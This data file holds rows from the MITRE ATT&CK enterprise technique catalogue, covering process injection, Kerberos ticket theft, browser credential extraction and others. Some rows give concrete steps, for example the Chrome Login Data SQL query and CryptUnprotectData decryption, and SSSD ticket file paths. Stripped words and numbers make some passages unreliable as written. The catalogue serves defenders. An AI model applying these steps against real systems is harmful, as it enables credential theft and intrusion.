attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e,['enterprise-attack'],['T1202'],Indirect Command Execution,adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command line interpreters  various windows utilities may be used to execute commands  possibly without invoking  for example   the program compatibility assistant  pcalua_exe   components of the windows subsystem for linux  wsl   as well as other utilities may invoke the execution of programs and commands from a  command and scripting  run window  or via scripts   citation  vectorsec forfiles aug        citation  evi cg forfiles nov        adversaries may abuse these features for  defense  specifically to perform arbitrary execution while subverting detections and or mitigation controls  such as group policy  that limit prevent the usage of  or file extensions more commonly associated with malicious payloads 
attack-pattern--3b3cbbe0-6ed3-4334-b543-3ddfd8c5642d,['enterprise-attack'],['T1024'],Custom Cryptographic Protocol,adversaries may use a custom cryptographic protocol or algorithm to hide command and control traffic  a simple scheme  such as xor ing the plaintext with a fixed key  will produce a very weak ciphertext_  custom encryption schemes may vary in sophistication  analysis and reverse engineering of malware samples may be enough to discover the algorithm and encryption key used_  some adversaries may also attempt to implement their own version of a well known cryptographic algorithm instead of using a known implementation library  which may lead to unintentional errors   citation  f secure cosmicduke 
attack-pattern--3b4121aa-fc8b-40c8-ac4f-afcb5838b72c,['enterprise-attack'],['T1536'],Revert Cloud Instance,an adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence  in highly virtualized environments  such as cloud based infrastructure  this may be accomplished by restoring virtual machine  vm  or data storage snapshots through the cloud management dashboard or cloud apis_  another variation of this technique is to utilize temporary storage attached to the compute instance  most cloud providers provide various types of storage including persistent  local  and or ephemeral  with the ephemeral types often reset upon stop restart of the vm_ citation  tech republic   restore aws snapshots  citation  google   restore cloud snapshot 
attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4,['enterprise-attack'],['T1091'],Replication Through Removable Media,adversaries may move onto systems  possibly those on disconnected or air gapped networks  by copying malware to removable media and taking advantage of autorun features when the media is inserted into a system and executes  in the case of lateral movement  this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system  in the case of initial access  this may occur through manual manipulation of the media  modification of systems used to initially format the media  or modification to the media's firmware itself_  mobile devices may also be used to infect pcs with malware if connected via usb_ citation  exploiting smartphone usb   this infection may be achieved using devices  android  ios  etc_  and  in some instances  usb charging cables_ citation  windows malware infecting android  citation  iphone charging cable hack  for example  when a smartphone is connected to a system  it may appear to be mounted similar to a usb connected disk drive  if malware that is compatible with the connected system is on the mobile device  the malware could infect the machine  especially if autorun features are enabled  
attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5,['enterprise-attack'],['T1005'],Data from Local System,adversaries may search local system sources  such as file systems and configuration files or local databases  to find files of interest and sensitive data prior to exfiltration_  adversaries may do this using a  command and scripting  such as  as well as a  network device  which have functionality to interact with the file system to gather information  adversaries may also use  automated  on the local system_
attack-pattern--3ccef7ae-cb5e-48f6-8302-897105fbf55c,['enterprise-attack'],['T1140'],Deobfuscate/Decode Files or Information,adversaries may use  obfuscated files or  to hide artifacts of an intrusion from analysis  they may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it  methods for doing that include built in functionality of malware or by using utilities present on the system_  one such example is use of  to decode a remote access tool portable executable file that has been hidden inside a certificate file   citation  malwarebytes targeted attack against saudi arabia  another example is using the windows copy  b command to reassemble binary fragments into a malicious payload   citation  carbon black obfuscation sept        sometimes a user's action may be required to open it for deobfuscation or decryption as part of  user  the user may also be required to input a password to open a password protected compressed encrypted file that was provided by the adversary   citation  volexity powerduke november      
attack-pattern--3d1b9d7e-3921-4d25-845a-7d9f15c0da44,['enterprise-attack'],['T1137.005'],Outlook Rules,adversaries may abuse microsoft outlook rules to obtain persistence on a compromised system  outlook rules allow a user to define automated behavior to manage email messages  a benign rule might  for example  automatically move an email to a particular folder in outlook if it contains specific words from a specific sender  malicious outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user_ citation  silentbreak outlook rules   once malicious rules have been added to the user s mailbox  they will be loaded when outlook is started  malicious rules will execute when an adversary sends a specifically crafted email to the user_ citation  silentbreak outlook rules 
attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529,['enterprise-attack'],['T1562'],Impair Defenses,adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms  this not only involves impairing preventative defenses  such as firewalls and anti virus  but also detection capabilities that defenders can use to audit activity and identify malicious behavior  this may also span both native defenses as well as supplemental capabilities installed by users and administrators_  adversaries could also target event aggregation and analysis mechanisms  or otherwise disrupt these procedures by altering other system components 
attack-pattern--3d52e51e-f6db-4719-813c-48002a99f43a,['enterprise-attack'],['T1586.003'],Cloud Accounts,adversaries may compromise cloud accounts that can be used during targeting  adversaries can use compromised cloud accounts to further their operations  including leveraging cloud storage services such as dropbox  microsoft onedrive  or aws s  buckets for  exfiltration to cloud  or to  upload  cloud accounts can also be used in the acquisition of infrastructure  such as  virtual private  or  infrastructure  compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers_ citation  awake security c  cloud   a variety of methods exist for compromising cloud accounts  such as gathering credentials via  phishing for  purchasing credentials from third party sites  conducting  password  attacks  or attempting to  steal application access  mstic nobelium oct       prior to compromising cloud accounts  adversaries may conduct reconnaissance to inform decisions about which accounts to compromise to further their operation  in some cases  adversaries may target privileged service provider accounts with the intent of leveraging a  trusted  between service providers and their customers_ citation  mstic nobelium oct      
attack-pattern--3dc8c101-d4db-4f4d-8150-1b5a76ca5f1b,['enterprise-attack'],['T1586.002'],Email Accounts,adversaries may compromise email accounts that can be used during targeting  adversaries can use compromised email accounts to further their operations  such as leveraging them to conduct  phishing for  or  utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship  or knowledge of  the compromised persona  compromised email accounts can also be used in the acquisition of infrastructure  ex    a variety of methods exist for compromising email accounts  such as gathering credentials via  phishing for  purchasing credentials from third party sites  or by brute forcing credentials  ex  password reuse from breach credential dumps   prior to compromising email accounts  adversaries may conduct reconnaissance to inform decisions about which accounts to compromise to further their operation_  adversaries can use a compromised email account to hijack existing email threads with targets of interest 
attack-pattern--3ee16395-03f0-4690-a32e-69ce9ada0f9e,['enterprise-attack'],['T1608.001'],Upload Malware,adversaries may upload malware to third party or adversary controlled infrastructure to make it accessible during targeting  malicious software can include payloads  droppers  post compromise tools  backdoors  and a variety of other malicious content  adversaries may upload malware to support their operations  such as making a payload available to a victim network to enable  ingress tool  by placing it on an internet accessible web server_  malware may be placed on infrastructure that was previously purchased rented by the adversary   acquire  or was otherwise compromised by them   compromise  malware can also be staged on web services  such as github or pastebin_ citation  volexity ocean lotus november        adversaries may upload backdoored files  such as application binaries  virtual machine images  or container images  to third party software stores or repositories  ex  github  cnet  aws community amis  docker hub   by chance encounter  victims may directly download install these backdoored files via  user   may increase the chance of users mistakenly executing these files 
attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7,['enterprise-attack'],['T1195'],Supply Chain Compromise,adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise_  supply chain compromise can take place at any stage of the supply chain including     manipulation of development tools   manipulation of a development environment   manipulation of source code repositories  public or private    manipulation of source code in open source dependencies   manipulation of software update distribution mechanisms   compromised infected system images  multiple cases of removable media infected at the factory  citation  ibm storwize  citation  schneider electric usb malware     replacement of legitimate software with modified versions   sales of modified counterfeit products to legitimate distributors   shipment interdiction  while supply chain compromise can impact any component of hardware or software  adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels_ citation  avast ccleaner        citation  microsoft dofoil       citation  command five sk       targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims_ citation  symantec elderwood sept       citation  avast ccleaner        citation  command five sk       popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency_ citation  trendmicro npm compromise 
attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c,['enterprise-attack'],['T1190'],Exploit Public-Facing Application,adversaries may attempt to take advantage of a weakness in an internet facing computer or program using software  data  or commands in order to cause unintended or unanticipated behavior  the weakness in the system can be a bug  a glitch  or a design vulnerability  these applications are often websites  but can include databases  like sql   standard services  like smb or ssh   network device administration and management protocols  like snmp and smart install   and any other applications with internet accessible open sockets  such as web servers and related services_ citation  nvd cve            citation  cis multiple smb vulnerabilities  citation  us cert ta      a network infrastructure devices       citation  cisco blog legacy device attacks  citation  nvd cve            depending on the flaw being exploited this may include  exploitation for defense    if an application is hosted on cloud based infrastructure and or is containerized  then exploiting it may lead to compromise of the underlying instance or container  this can allow an adversary a path to access the cloud or container apis  exploit container host access via  escape to  or take advantage of weak identity and access management policies_  for websites and databases  the owasp top    and cwe top    highlight the most common web based vulnerabilities_ citation  owasp top     citation  cwe top    
attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a,['enterprise-attack'],['T1558'],Steal or Forge Kerberos Tickets,adversaries may attempt to subvert kerberos authentication by stealing or forging kerberos tickets to enable  pass the  kerberos is an authentication protocol widely used in modern windows domain environments  in kerberos environments  referred to as  realms   there are three basic participants  client  service  and key distribution center  kdc _ citation  adsecurity kerberos ring decoder  clients request access to a service and through the exchange of kerberos tickets  originating from kdc  they are granted access after having successfully authenticated  the kdc is responsible for both authentication and ticket granting   adversaries may attempt to abuse kerberos by stealing tickets or forging tickets to enable unauthorized access_  on windows  the built in klist utility can be used to list and analyze cached kerberos tickets_ citation  microsoft klist   linux systems on active directory domains store kerberos credentials locally in the credential cache file referred to as the  ccache   the credentials are stored in the ccache file while they remain valid and generally while a user's session lasts_ citation  mit ccache  on modern redhat enterprise linux systems  and derivative distributions  the system security services daemon  sssd  handles kerberos tickets  by default sssd maintains a copy of the ticket database that can be found in  var lib sss secrets secrets_ldb as well as the corresponding key located in  var lib sss secrets _secrets_mkey  both files require root access to read  if an adversary is able to access the database and key  the credential cache kerberos blob can be extracted and converted into a usable kerberos ccache file that adversaries may use for  pass the  the ccache file may also be converted into a windows format using tools such as kekeo_ citation  linux kerberos tickets  citation  brining mimikatz to unix    kerberos tickets on macos are stored in a standard ccache format  similar to linux  by default  access to these ccache entries is federated through the kcm daemon process via the mach rpc protocol  which uses the caller's environment to determine access  the storage location for these ccache entries is influenced by the  etc krb _conf configuration file and the krb ccname environment variable which can specify to save them to disk or keep them protected via the kcm daemon  users can interact with ticket storage using kinit  klist  ktutil  and kcc built in binaries or via apple's native kerberos framework  adversaries can use open source tools to interact with the ccache files directly or to use the kerberos framework to call lower level apis for extracting the user's tgt or service tickets_ citation  spectorops bifrost kerberos macos       citation  macos kerberos framework mit 
attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0,['enterprise-attack'],['T1555'],Credentials from Password Stores,adversaries may search for common password storage locations to obtain user credentials  passwords are stored in several places on a system  depending on the operating system or application holding the credentials  there are also specific applications that store passwords to make it easier for users manage and maintain  once credentials are obtained  they can be used to perform lateral movement and access restricted information 
attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807,['enterprise-attack'],['T1567'],Exfiltration Over Web Service,adversaries may use an existing  legitimate external web service to exfiltrate data rather than their primary command and control channel  popular web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise  firewall rules may also already exist to permit traffic to these services_  web service providers also commonly use ssl tls encryption  giving adversaries an added level of protection 
attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7,['enterprise-attack'],['T1219'],Remote Access Software,an adversary may use legitimate desktop support and remote access software  such as team viewer  anydesk  go assist  logmein  ammyyadmin  etc  to establish an interactive command and control channel to target systems within networks  these services are commonly used as legitimate technical support software  and may be allowed by application control within a target environment  remote access tools like vnc  ammyy  and teamviewer are used frequently when compared with other legitimate software commonly used by adversaries_ citation  symantec living off the land   remote access tools may be installed and used post compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system  they may also be used as a component of malware to establish a reverse connection or back connect to a service or adversary controlled system  installation of many remote access tools may also include persistence  ex  the tool's installation routine creates a  windows   admin tools such as teamviewer have been used by several groups targeting institutions in countries of interest to the russian state and criminal campaigns_ citation  crowdstrike      global threat report  citation  crysys blog teamspy 
attack-pattern--40f5caa0-4cb7-4117-89fc-d421bb493df3,['enterprise-attack'],['T1583.001'],Domains,adversaries may acquire domains that can be used during targeting  domain names are the human readable names used to represent one or more ip addresses  they can be purchased or  in some cases  acquired for free_  adversaries may use acquired domains for a variety of purposes  including for   drive by  and command and control_ citation  cisa mss sep       adversaries may choose domains that are similar to legitimate domains  including through use of homoglyphs or use of a different top level domain  tld _ citation  fireeye apt    typosquatting may be used to aid in delivery of payloads via  drive by  adversaries may also use internationalized domain names  idns  and different character sets  e_g  cyrillic  greek  etc_  to execute  idn homograph attacks   creating visually similar lookalike domains used to deliver malware to victim machines_ citation  cisa idn st         adversaries may also acquire and repurpose expired domains  which may be potentially already allowlisted trusted by defenders based on an existing reputation history_  domain registrars each maintain a publicly viewable database that displays contact information for every registered domain  private whois services display alternative information  such as their own company data  rather than the owner of the domain  adversaries may use such private whois services to obscure information about who owns a purchased domain  adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars_ citation  mandiant apt  
attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6,['enterprise-attack'],['T1560.002'],Archive via Library,an adversary may compress or encrypt data that is collected prior to exfiltration using  rd party libraries  many libraries exist that can archive data  including  rarfile  citation  pypi rar   libzip   and zlib  citation  zlib github   most libraries include functionality to encrypt and or compress data_  some archival libraries are preinstalled on systems  such as bzip  on macos and linux  and zip on windows  note that the libraries are different from the utilities  the libraries can be linked against when compiling  while the utilities require spawning a subshell  or a similar execution mechanism 
attack-pattern--41d9846c-f6af-4302-a654-24bba2729bc6,['enterprise-attack'],['T1055.003'],Thread Execution Hijacking,adversaries may inject malicious code into hijacked processes in order to evade process based defenses as well as possibly elevate privileges  thread execution hijacking is a method of executing arbitrary code in the address space of a separate live process    thread execution hijacking is commonly performed by suspending an existing process then unmapping hollowing its memory  which can then be replaced with malicious code or the path to a dll  a handle to an existing victim process is first created with native windows api calls such as openthread  at this point the process can be suspended then written to  realigned to the injected code  and resumed via suspendthread   virtualallocex  writeprocessmemory  setthreadcontext  then resumethread respectively_ citation  elastic process injection july        this is very similar to  process  but targets an existing process rather than creating a process in a suspended state     running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via thread execution hijacking may also evade detection from security products since the execution is masked under a legitimate process 
attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e,['enterprise-attack'],['T1079'],Multilayer Encryption,an adversary performs c  communications using multiple layers of encryption  typically  but not exclusively  tunneling a custom encryption scheme within a protocol encryption scheme such as https or smtps 
attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0,['enterprise-attack'],['T1036'],Masquerading,adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and or security tools  masquerading occurs when the name or location of an object  legitimate or malicious  is manipulated or abused for the sake of evading defenses and observation  this may include manipulating file metadata  tricking users into misidentifying the file type  and giving legitimate task or service names_  renaming abusable system utilities to evade security monitoring is also a form of  lolbas main site 
attack-pattern--42fe883a-21ea-4cfb-b94a-78b6476dcc83,['enterprise-attack'],['T1546.011'],Application Shimming,adversaries may establish persistence and or elevate privileges by executing malicious content triggered by application shims  the microsoft windows application compatibility infrastructure framework  application shim  was created to allow for backward compatibility of software as the operating system codebase changes over time  for example  the application shimming feature allows developers to apply fixes to applications  without rewriting code  that were created for windows xp so that it will work with windows      citation  elastic process injection july        within the framework  shims are created to act as a buffer between the program  or more specifically  the import address table  and the windows os  when a program is executed  the shim cache is referenced to determine if the program requires the use of the shim database  _sdb   if so  the shim database uses hooking to redirect the code as necessary in order to communicate with the os    a list of all shims currently installed by the default windows installer  sdbinst_exe  is kept in      windir  apppatch sysmain_sdb and   hklm software microsoft windows nt currentversion appcompatflags installedsdb  custom databases are stored in      windir  apppatch custom    windir  apppatch apppatch   custom and   hklm software microsoft windows nt currentversion appcompatflags custom  to keep shims secure  windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim  however  certain shims can be used to  bypass user account   uac and redirectexe   inject dlls into processes  injectdll   disable data execution prevention  disablenx  and structure exception handling  disableseh   and intercept memory addresses  getprocaddress _  utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges  install backdoors  disable defenses like windows defender  etc   citation  fireeye application shimming  shims can also be abused to establish persistence by continuously being invoked by affected programs 
attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517,['enterprise-attack'],['T1552'],Unsecured Credentials,adversaries may search compromised systems to find and obtain insecurely stored credentials  these credentials can be stored and or misplaced in many locations on a system  including plaintext files  e_g   bash  operating system or application specific repositories  e_g   credentials in  or other specialized files artifacts  e_g   private
attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe,['enterprise-attack'],['T1547.010'],Port Monitors,adversaries may use port monitors to run an adversary supplied dll during system boot for persistence or privilege escalation  a port monitor can be set through the addmonitor api call to set a dll to be loaded at startup  this dll can be located in c  windows system   and will be loaded by the print spooler service  spoolsv_exe  on boot  the spoolsv_exe process also runs under system level permissions  alternatively  an arbitrary dll can be loaded if permissions allow writing a fully qualified pathname for that dll to hklm system currentcontrolset control print monitors    the registry key contains entries for the following     local port   standard tcp ip port   usb monitor   wsd port  adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as system 
attack-pattern--438c967d-3996-4870-bfc2-3954752a1927,['enterprise-attack'],['T1070.008'],Clear Mailbox Data,adversaries may modify mail application data to remove evidence of their activity  email applications allow users and other programs to export and delete mailbox data via command line tools or use of apis  mail application data can be emails or logs generated by the application or operating system  such as export requests    adversaries may manipulate email mailbox data to remove logs and artifacts  such as evidence of    email   mail  for command and control  or email based exfiltration such as  exfiltration over alternative  for example  to remove evidence on exchange servers adversaries have used the exchangepowershell  module  including remove mailboxexportrequest to remove evidence of mailbox exports_ citation  volexity solarwinds  citation  exchangepowershell module  on linux and macos  adversaries may also delete emails through a command line utility called mail  or use  to interact with apis on macos_ citation  cybereason cobalt kitty       citation  mailx man page 
attack-pattern--43ba2b05-cf72-4b6c-8243-03a4aba41ee0,['enterprise-attack'],['T1037.002'],Login Hook,adversaries may use a login hook to establish persistence executed upon user logon  a login hook is a plist file that points to a specific script to execute with root privileges upon user logon  the plist file is located in the  library preferences com_apple_loginwindow_plist file and can be modified using the defaults command line utility  this behavior is the same for logout hooks where a script can be executed upon user logout  all hooks require administrator permissions to modify or create hooks_ citation  login scripts apple dev  citation  loginwindowscripts apple dev    adversaries can add or insert a path to a malicious script in the com_apple_loginwindow_plist file  using the loginhook or logouthook key value pair  the malicious script is executed upon the next user login  if a login hook already exists  adversaries can add additional commands to an existing login hook  there can be only one login and logout hook on a system at a time_ citation  s  macos persistence  citation  wardle persistence chapter     note    login hooks were deprecated in   _   version of macos in favor of  launch  and  launch
attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d,['enterprise-attack'],['T1055'],Process Injection,adversaries may inject code into processes in order to evade process based defenses as well as possibly elevate privileges  process injection is a method of executing arbitrary code in the address space of a separate live process  running code in the context of another process may allow access to the process's memory  system network resources  and possibly elevated privileges  execution via process injection may also evade detection from security products since the execution is masked under a legitimate process    there are many different ways to inject code into a process  many of which abuse legitimate functionalities  these implementations exist for every major os but are typically platform specific    more sophisticated samples may perform multiple process injections to segment modules and further evade detection  utilizing named pipes or other inter process communication  ipc  mechanisms as a communication channel 
attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8,['enterprise-attack'],['T1139'],Bash History,bash keeps track of the commands users type on the command line with the  history  utility  once a user logs out  the history is flushed to the user s _bash_history file  for each user  this file resides at the same location    _bash_history  typically  this file keeps track of the user s last     commands  users often type usernames and passwords on the command line as parameters to programs  which then get saved to this file when they log out  attackers can abuse this by looking through the file for potential credentials   citation  external to da  the os x way 
attack-pattern--451a9977-d255-43c9-b431-66de80130c8c,['enterprise-attack'],['T1205'],Traffic Signaling,adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control  traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response  such as opening a closed port or executing a malicious task  this may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control  usually this series of packets consists of attempted connections to a predefined sequence of closed ports  i_e   port  but can involve unusual flags  specific strings  or other unique characteristics  after the sequence is completed  opening a port may be accomplished by the host based firewall  but could also be implemented by custom software_  adversaries may also communicate with an already open port  but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value s _  the observation of the signal packets to trigger the communication can be conducted through different methods  one means  originally implemented by cd  r  citation  hartrell cd  r        is to use the libpcap libraries to sniff for the packets in question  another method leverages raw sockets  which enables the malware to use ports that are already open for use by other programs_  on network devices  adversaries may use crafted packets to enable  network device  for standard services offered by the device such as telnet   such signaling may also be used to open a closed service port such as telnet  or to trigger module modification of malware implants on the device  adding  removing  or changing malicious capabilities   adversaries may use crafted packets to attempt to connect to one or more  open or closed  ports  but may also attempt to connect to a router interface  broadcast  and network address ip on the same port in order to achieve their goals and objectives_ citation  cisco synful knock evolution  citation  mandiant   synful knock  citation  cisco blog legacy device attacks   to enable this traffic signaling on embedded devices  adversaries must first achieve and leverage  patch system  due to the monolithic nature of the architecture_  adversaries may also use the wake on lan feature to turn on powered off systems  wake on lan is a hardware feature that allows a powered down system to be powered on  or woken up  by sending a magic packet to it  once the system is powered on  it may become a target for lateral movement_ citation  bleeping computer   ryuk wol  citation  amd magic packet 
attack-pattern--4579d9c9-d5b9-45e0-9848-0104637b579f,['enterprise-attack'],['T1503'],Credentials from Web Browsers,adversaries may acquire credentials from web browsers by reading files specific to the target browser    citation  talos olympic destroyer         web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future  web browsers typically store the credentials in an encrypted format within a credential store  however  methods exist to extract plaintext credentials from web browsers_  for example  on windows systems  encrypted credentials may be obtained from google chrome by reading a database file  appdata local google chrome user data default login data and executing a sql query  select action_url  username_value  password_value from logins   the plaintext password can then be obtained by passing the encrypted credentials to the windows api function cryptunprotectdata  which uses the victim s cached logon credentials as the decryption key   citation  microsoft cryptunprotectdata april         adversaries have executed similar procedures for common web browsers such as firefox  safari  edge  etc   citation  proofpoint vega credential stealer may       citation  fireeye hawkeye malware july        adversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials_ citation  github mimikittenz july        after acquiring credentials from web browsers  adversaries may attempt to recycle the credentials across different systems and or accounts in order to expand access  this can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts  e_g  domain administrator  
attack-pattern--457c7820-d331-465a-915e-42f85500ccc4,['enterprise-attack'],['T1218'],System Binary Proxy Execution,adversaries may bypass process and or signature based defenses by proxying execution of malicious content with signed  or otherwise trusted  binaries  binaries used in this technique are often microsoft signed files  indicating that they have been either downloaded from microsoft or are already native in the operating system_ citation  lolbas project  binaries signed with trusted digital certificates can typically execute on windows systems protected by digital signature validation  several microsoft signed binaries that are default on windows installations can be used to proxy execution of other files or commands_  similarly  on linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands_ citation  split man page  citation  gtfo split 
attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0,['enterprise-attack'],['T1153'],Source,  this technique has been deprecated and should no longer be used_    the source command loads functions into the current shell or executes files in the current context  this built in command can be run in two different ways source  path to filename  arguments  or _  this technique has been deprecated and should no longer be used_    path to filename  arguments   take note of the space after the      without a space  a new shell is created that runs the program instead of running the program within the current context  this is often used to make certain features or functions available to a shell or to update a specific shell's environment_ citation  source manual   adversaries can abuse this functionality to execute programs  the file executed with this technique does not need to be marked executable beforehand 
attack-pattern--46944654-fcc1-4f63-9dad-628102376586,['enterprise-attack'],['T1038'],DLL Search Order Hijacking,windows systems use a common method to look for required dlls to load into a program   citation  microsoft dll search  adversaries may take advantage of the windows dll search order and programs that ambiguously specify dlls to gain privilege escalation and persistence    adversaries may perform dll preloading  also called binary planting attacks   citation  owasp binary planting  by placing a malicious dll with the same name as an ambiguously specified dll in a location that windows searches before the legitimate dll  often this location is the current working directory of the program  remote dll preloading attacks occur when a program sets its current directory to a remote location such as a web share before loading a dll   citation  microsoft          adversaries may use this behavior to cause the program to load a malicious dll    adversaries may also directly modify the way a program loads dlls by replacing an existing dll or modifying a _manifest or _local redirection file  directory  or junction to cause the program to load a different dll to maintain persistence or privilege escalation   citation  microsoft dll redirection   citation  microsoft manifests   citation  mandiant search order   if a search order vulnerable program is configured to run at a higher privilege level  then the adversary controlled dll that is loaded will also be executed at the higher level  in this case  the technique could be used for privilege escalation from user to administrator or system or from administrator to system  depending on the program_  programs that fall victim to path hijacking may appear to behave normally because malicious dlls may be configured to also load the legitimate dlls they were meant to replace 
attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790,['enterprise-attack'],['T1050'],New Service,when operating systems boot up  they can start programs or applications called services that perform background system functions   citation  technet services  a service's configuration information  including the file path to the service's executable  is stored in the windows registry    adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the registry  the service name may be disguised by using a name from a related operating system or benign software with  services may be created with administrator privileges but are executed under system privileges  so an adversary may also use a service to escalate privileges from administrator to system  adversaries may also directly start services through  service
attack-pattern--47f2d673-ca62-47e9-929b-1b0be9657611,['enterprise-attack'],['T1070.006'],Timestomp,adversaries may modify file time attributes to hide new or changes to existing files  timestomping is a technique that modifies the timestamps of a file  the modify  access  create  and change times   often to mimic files that are in the same folder  this is done  for example  on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools_  timestomping may be used along with file name  to hide malware and tools_ citation  windowsir anti forensic techniques 
attack-pattern--4933e63b-9b77-476e-ab29-761bc5b7d15a,['enterprise-attack'],['T1620'],Reflective Code Loading,adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads  reflective loading involves allocating then executing payloads directly within the memory of the process  vice creating a thread or process backed by a file path on disk  reflectively loaded payloads may be compiled binaries  anonymous files  only present in ram   or just snubs of fileless executable code  ex  position independent shellcode _ citation  introducing donut  citation  s  custom shellcode tool  citation  stuart elf memory  citation    sec droppers  citation  mandiant byol   reflective code injection is very similar to  process  except that the  injection  loads code into the processes  own memory instead of that of a separate process  reflective loading may evade process based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process  reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk  while also enabling malware to keep these payloads encrypted  or otherwise obfuscated  until execution_ citation  stuart elf memory  citation    sec droppers  citation  intezer acbackdoor  citation  s  old rat new tricks 
attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665,['enterprise-attack'],['T1611'],Escape to Host,adversaries may break out of a container to gain access to the underlying host  this can allow an adversary access to other containerized resources from the host level or to the host itself  in principle  containerized resources should provide a clear separation of application functionality and be isolated from the host environment_ citation  docker overview   there are multiple ways an adversary may escape to a host environment  examples include creating a container configured to mount the host s filesystem using the bind parameter  which allows the adversary to drop payloads and execute control utilities such as cron on the host  utilizing a privileged container to run commands or load a malicious kernel module on the underlying host  or abusing system calls such as  unshare  and  keyctl  to escalate privileges and steal secrets_ citation  docker bind mounts  citation  trend micro privileged container  citation  intezer doki july     citation  container escape  citation  crowdstrike kubernetes container escape   additionally  an adversary may be able to exploit a compromised container with a mounted container management socket  such as  docker_sock   to break out of the container via a  container administration  container escape  adversaries may also escape via  exploitation for privilege  such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine_ citation  windows server containers are open   gaining access to the host may provide the adversary with the opportunity to achieve follow on objectives  such as establishing persistence  moving laterally within the environment  or setting up a command and control channel on the host 
attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179,['enterprise-attack'],['T1547.009'],Shortcut Modification,adversaries may create or modify shortcuts that can execute a program during system boot or user login  shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process_  adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence_ citation  shortcut for persistence   although often used as payloads in an infection chain  e_g   spearphishing  adversaries may also create a new shortcut as a means of indirection  while also abusing  to make the malicious shortcut appear as a legitimate program  adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program_  shortcuts can also be abused to establish persistence by implementing other methods  for example  lnk browser extensions may be modified  e_g   browser  to persistently launch malware 
attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830,['enterprise-attack'],['T1010'],Application Window Discovery,adversaries may attempt to get a listing of open application windows  window listings could convey information about how the system is used or give context to information collected by a keylogger_ citation  prevailion darkwatchman      
attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5,['enterprise-attack'],['T1032'],Standard Cryptographic Protocol,adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol  despite the use of a secure algorithm  these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and or generated within malware samples configuration files 
attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470,['enterprise-attack'],['T1087.003'],Email Account,adversaries may attempt to get a listing of email addresses and accounts  adversaries may try to dump exchange address lists such as global address lists  gals _ citation  microsoft exchange address lists   in on premises exchange and exchange online  theget globaladdresslist powershell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session_ citation  microsoft getglobaladdresslist  citation  black hills attacking exchange mailsniper         in google workspace  the gal is shared with microsoft outlook users through the google workspace sync for microsoft outlook  gwsmo  service  additionally  the google workspace directory allows for users to get a listing of other users within the organization_ citation  google workspace global access list 
